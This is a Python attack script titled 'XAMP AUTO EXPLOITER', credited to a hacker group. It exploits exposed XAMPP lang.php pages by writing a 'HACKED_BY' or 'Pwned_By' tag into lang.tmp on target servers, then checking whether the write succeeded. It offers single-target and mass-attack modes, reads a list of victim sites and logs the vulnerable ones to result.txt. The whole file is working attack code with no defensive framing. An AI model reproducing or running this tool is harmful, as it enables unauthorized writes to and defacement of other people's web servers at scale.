import requests
import time, os, sys, re
import urllib

R = '\033[31m'   # Red
N = '\033[1;37m' # White
G = '\033[32m'   # Green
O = '\033[0;33m' # Orange
B = '\033[1;34m' # Blue
C = '\033[36m' # cyan


def banner():
	print ("""
\033[0;33m[*] XAMP AUTO EXPLOITER [*]
\033[36m[*] C0D3D By : \033[0;33m M0nalisa ( ./Serizawa ) 
\033[36m[*] Family Attack Cyber
FA HAXOR ~ DANN ~ FAISAL ~ AALEX ~ SULTON ~ AGO OENG ~ BACOD LO 
""")

def menu():
	print ("""
	[1] Single Attack
	[2] Mass Attack
	""")


class allmight:
	def __init__(self):
		print ("[*] ex : target.com/xampp/")
		print ("[*] ex : target.com/security/")
		print ("\033[36m [*] Nick Dont Using Space")
		self.target = input("Target => ")
		self.nick = input("Your Nick => ")
		self.turun = ("HACKED_BY_{}".format(self.nick))
	def dabi(self):
		if "/xampp" in self.target:
			iya = ("{}lang.php?{}" .format(self.target, self.turun))
			yayaya = requests.get(iya).text
			yuki = ("{}lang.tmp" .format(self.target))
			endevour = requests.get(yuki)
			angi = endevour.text
			if self.turun in angi:
				print ("OCE")
				print ("Akses => %s" % yuki)
			else:
				print ("ga vuln")

		elif "/security" in self.target:
			oke = ("{}lang.php?{}" .format(self.target, self.turun))
			ion = requests.get(oke).text
			nani = ("{}lang.tmp" .format(self.target))
			kya = requests.get(nani)
			lalala = kya.text
			if self.turun in lalala:
				print ("OCE")
				print ("Akses => %s" % nani)
			else:
				print ("ga vuln")

class mass:
	def __init__(self):
		print ("[*] Target ex : site.com/xampp/")
		print ("[*] Target ex : site.com/security/")
		print ("[*] Nick Dont Using Space, Ex : M0nalisa_Haxor")
		print ("")
		self.nick = input("Ur Nick => ")
		self.kairo = input("List Target => ")
		os.system('clear')
	def kana(self):
		try:
			sukses = []
			self.nani = open(self.kairo, "r").readlines()
			for i in self.nani:
				try:
					anggichan = i.strip()
					if "/xampp" in anggichan:
						kantin = (anggichan + "lang.php?Pwned_By_{}" .format(self.nick))
						omaewa = requests.get(kantin).text
						mulus = (anggichan + "lang.tmp")
						iyaaja = requests.get(mulus).text
						if self.nick in iyaaja:
							print ("\033[36m[ WORK ] {} " .format(mulus))
							sukses.append(mulus)
						elif self.nick not in iyaaja:
							print ("\033[0;33m[ DIE ]{}   " .format(mulus))

					elif "/security" in anggichan:
						angi = (anggichan + "lang.php?Pwned_By_{}" .format(self.nick))
						bwa = requests.get(angi).text
						kasar = (anggichan + "lang.tmp")
						okein = requests.get(kasar).text
						if self.nick in okein:
							print ("\033[36m[ WORK ]{}  " .format(kasar))
							sukses.append(kasar)
						elif self.nick not in okein:
							print ("\033[0;33m[ DIE ]{}   " .format(kasar))

					with open("result.txt", "w") as f:
						for s in sukses:
							f.write(str(s) + '\n')

				except requests.exceptions.ConnectionError:
					print ("\033[0;33m ERROR CONNECTION ERROR")


		except KeyboardInterrupt:
				print ("CTRL+C")








if __name__ == "__main__":
	os.system('clear')
	banner()
	menu()
	raw = input("Choose Ur Number => ")
	if raw == '1':
		apsi = allmight()
		apsi.dabi()
	elif raw == '2':
		oalah = mass()
		oalah.kana()
	print ("SAVED IN Result.txt")
